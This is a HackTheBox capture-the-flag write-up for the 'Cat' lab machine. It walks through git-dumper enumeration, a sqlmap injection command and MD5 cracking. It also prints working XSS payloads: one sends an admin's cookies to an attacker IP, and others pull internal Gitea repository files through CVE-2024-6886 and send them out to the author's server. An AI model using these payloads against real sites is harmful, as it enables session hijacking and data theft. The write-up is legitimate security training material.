#  HackTheBox: Cat - Writeup
Cat is a Medium-difficulty machine on Hack The Box that blends web exploitation with real-world misconfigurations and insecure development practices. The machine begins with standard enumeration, leading to the discovery of an exposed .git directory containing source code for a custom web application. Through careful analysis, multiple vulnerabilities are identified including stored XSS, SQL injection, and poor session handling. The challenge also involves tunneling to access internal services, where a vulnerable Gitea instance (CVE-2024-6886, a persistent XSS flaw) is exploited to extract sensitive internal files. Overall, the box offers a solid progression path that tests enumeration, web exploitation, and lateral movement skills.

##  Enumeration

### Nmap Scan

Using nmap, we are able to identify any open ports. The following ports are open;
•	SSH (22)
•	Apache Web Server (80)
```bash
nmap –sCV 10.10.11.53
 ```
![Image Alt](https://github.com/mfahdk/Writeups/blob/main/HackTheBox/Cat/Screenshots/image001.png)

From the scripts scan, we can see a .git repository on the web server. Further enumeration using gobuster has been conducted but had no clear results. So now, we must add the machine’s IP to the hosts file in your machine.

 
## Initial foothold

### Git Enumeration
Using git-dumper, we able to extract the files in the .git directory of the web server.

```bash
git-dumper http://cat.htb/.bit gitFolder
```

![Image Alt](https://github.com/mfahdk/Writeups/blob/main/HackTheBox/Cat/Screenshots/image003.png)
 
We then explore some of the interesting files gained.

![Image Alt](https://github.com/mfahdk/Writeups/blob/main/HackTheBox/Cat/Screenshots/image005.png)
 
On the join.php file, there is no input sanitization for the username, possible XSS. Hmm interesting..

![Image Alt](https://github.com/mfahdk/Writeups/blob/main/HackTheBox/Cat/Screenshots/image007.png)
 
On the contest.php, the data of the users is sent to the SQL database. Including the username, which could be malicious.

![Image Alt](https://github.com/mfahdk/Writeups/blob/main/HackTheBox/Cat/Screenshots/image008.png)
 
On the admin.php, the admin (axel) either accepts or rejects the cat.

![Image Alt](https://github.com/mfahdk/Writeups/blob/main/HackTheBox/Cat/Screenshots/image0010.png)
 
The accept_cat.php is susceptible to SQLi, where the sql_insert statement is being used.

![Image Alt](https://github.com/mfahdk/Writeups/blob/main/HackTheBox/Cat/Screenshots/image013.png)
 
On the config.php some information about the SQL database and configuration is given.

![Image Alt](https://github.com/mfahdk/Writeups/blob/main/HackTheBox/Cat/Screenshots/image014.png)
 
Using all this information from the file, we can construct an attack procedure.

### Persitent XSS 

First, we can create a user with the XSS payload in the username field, to gain admin cookies.

```bash
<script>document.location='http://10.10.14.120:1111/?c='+document.cookie;</script>
```

![Image Alt](https://github.com/mfahdk/Writeups/blob/main/HackTheBox/Cat/Screenshots/image015.png)

Then register a normal cat in the contest.

![Image Alt](https://github.com/mfahdk/Writeups/blob/main/HackTheBox/Cat/Screenshots/image017.png)

From here, when admin accepts the cat, we gain his cookies.

![Image Alt](https://github.com/mfahdk/Writeups/blob/main/HackTheBox/Cat/Screenshots/image019.png)

Which we use, to hijack his session.

![Image Alt](https://github.com/mfahdk/Writeups/blob/main/HackTheBox/Cat/Screenshots/image021.png)

We are able to gain access to the admin.php, demonstrating successful XSS attack, now to get information from the SQL db, since we have the admin cookie.
 
## Exploitation

Since accept_cat.php is vulnerable to SQLi, we use the data provided from it, catID and catName to form a sqlmap comand.

```bash
sqlmap -u "http://cat.htb/accept_cat.php" --data="catId=1&catName=a" --cookie="PHPSESSID=ikn31got0uppvf5h3n5snv6cqh" -p "catName" --dbms=SQLite --dump --level=5 --risk=3 --flush-session --threads=5 --hex
```

![Image Alt](https://github.com/mfahdk/Writeups/blob/main/HackTheBox/Cat/Screenshots/image025.png)
 
During the process, we are able to gain some usernames and hashed passwords, these are noted down. Some of the users include; rosa, axel(admin), robert, and more..

![Image Alt](https://github.com/mfahdk/Writeups/blob/main/HackTheBox/Cat/Screenshots/image028.png)
 
The hashes identified are md5 hashes.

![Image Alt](https://github.com/mfahdk/Writeups/blob/main/HackTheBox/Cat/Screenshots/image030.png)
 
Using johntheripper, we are able to obtain the hashed credentials, note only user rosa has a correct hash, rest of the users do not.

``` bash
john hash --format=Raw-MD5 --wordlist=/usr/share/wordlists/dirb/rockyou.txt
```

![Image Alt](https://github.com/mfahdk/Writeups/blob/main/HackTheBox/Cat/Screenshots/image032.png)
 
Using the credentials, we are able to SSH into rosa’s user.

![Image Alt](https://github.com/mfahdk/Writeups/blob/main/HackTheBox/Cat/Screenshots/image033.png)

## Privelege Escalation
 
Using linPEAS, we are aiming to privilege escalate or find some information.

![Image Alt](https://github.com/mfahdk/Writeups/blob/main/HackTheBox/Cat/Screenshots/image035.png)
 
In the apache access logs, which are usually hidden contain the password of the user axel.

![Image Alt](https://github.com/mfahdk/Writeups/blob/main/HackTheBox/Cat/Screenshots/image038.png)

Using that, we are able to SSH into the axel user, and we see a new mail sent to axel.

![Image Alt](https://github.com/mfahdk/Writeups/blob/main/HackTheBox/Cat/Screenshots/image039.png)
 
And obtain the user flag.

![Image Alt](https://github.com/mfahdk/Writeups/blob/main/HackTheBox/Cat/Screenshots/image042.png)
 
Reading out the mail from rosa, we see a web page being hosted on the port 3000, which contains information about employees.

![Image Alt](https://github.com/mfahdk/Writeups/blob/main/HackTheBox/Cat/Screenshots/image043.png)

As seen, the web server is being hosted on port 3000, in order to access it need to do SSH tunnelling back to my machine.

![Image Alt](https://github.com/mfahdk/Writeups/blob/main/HackTheBox/Cat/Screenshots/image045.png)
 
Using SSH tunnelling on port 3000.

``` bash
ssh -L 3000:localhost:3000 axel@10.10.11.53
```

![Image Alt](https://github.com/mfahdk/Writeups/blob/main/HackTheBox/Cat/Screenshots/image047.png)
 
We are able to login into the gitea, using axel’s credentials.

![Image Alt](https://github.com/mfahdk/Writeups/blob/main/HackTheBox/Cat/Screenshots/image049.png)

We see this web server is powered by gitea version 1.22.0. Which is, vulnerable to Persistent XSS (CVE-2024-6886).

![Image Alt](https://github.com/mfahdk/Writeups/blob/main/HackTheBox/Cat/Screenshots/image051.png)

## Post-Exploitation
 
Using that information, I formed a XSS that accesses the employee-management readme and sends to my python server, accessing that information.

``` bash
<a href="javascript:
fetch('http://localhost:3000/administrator/Employee-management/raw/branch/main/README.md')
  .then(r => r.text())
  .then(d => fetch('http://10.10.14.182:8000/?d=' + btoa(d)))
">XSS test</a>
```

![Image Alt](https://github.com/mfahdk/Writeups/blob/main/HackTheBox/Cat/Screenshots/image054.png)
 
The link of the git is then sent to jobert, as instructed in the mail.

``` bash
echo "http://localhost:3000/axel/test/" | sendmail jobert@localhost
```

![Image Alt](https://github.com/mfahdk/Writeups/blob/main/HackTheBox/Cat/Screenshots/image056.png)
 
The obtained data is then decoded from base64, getting the following information;

`
Employee Management
Site under construction. Authorized user: admin. No visibility or updates visible to employees.
In order to get the contents of the git, the following script is formed.
`
``` bash
<a href="javascript:fetch('http://localhost:3000/administrator/Employee-management/')
  .then(r => r.text())
  .then(d => fetch('http://10.10.15.95:8000', {
    method: 'POST',
    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
    body: 'data=' + encodeURIComponent(d)
  }))">
  Click me
</a>
```

![Image Alt](https://github.com/mfahdk/Writeups/blob/main/HackTheBox/Cat/Screenshots/image057.png)
 
After decoding the received data, the following paths are found; 

![Image Alt](https://github.com/mfahdk/Writeups/blob/main/HackTheBox/Cat/Screenshots/image059.png)
 
There are the interesting paths, containing files;

```
/administrator/Employee-management/src/branch/main/chart.min.js
/administrator/Employee-management/src/branch/main/dashboard.php
/administrator/Employee-management/src/branch/main/index.php
/administrator/Employee-management/src/branch/main/logout.php
/administrator/Employee-management/src/branch/main/README.md
/administrator/Employee-management/src/branch/main/style.css
```

Upon finding those paths, I used the XSS script to get back data from those paths, and from index.php I obtained the admin credentials, getting the root flag.
 
![Image Alt](https://github.com/mfahdk/Writeups/blob/main/HackTheBox/Cat/Screenshots/image062.jpg)

![Image Alt](https://github.com/mfahdk/Writeups/blob/main/HackTheBox/Cat/Screenshots/image064.jpg)

# Conclusion

The Cat machine demonstrates a realistic multi-step exploitation process, beginning with identifying exposed services and extracting a .git directory to gain source code access. From there, a combination of XSS and SQL injection vulnerabilities was used to hijack the admin session and extract sensitive data. This led to credential reuse and lateral movement via SSH, ultimately revealing additional services through log analysis and tunneling. By exploiting a persistent XSS vulnerability in Gitea, sensitive internal project files were accessed, allowing for privilege escalation and recovery of the root flag.

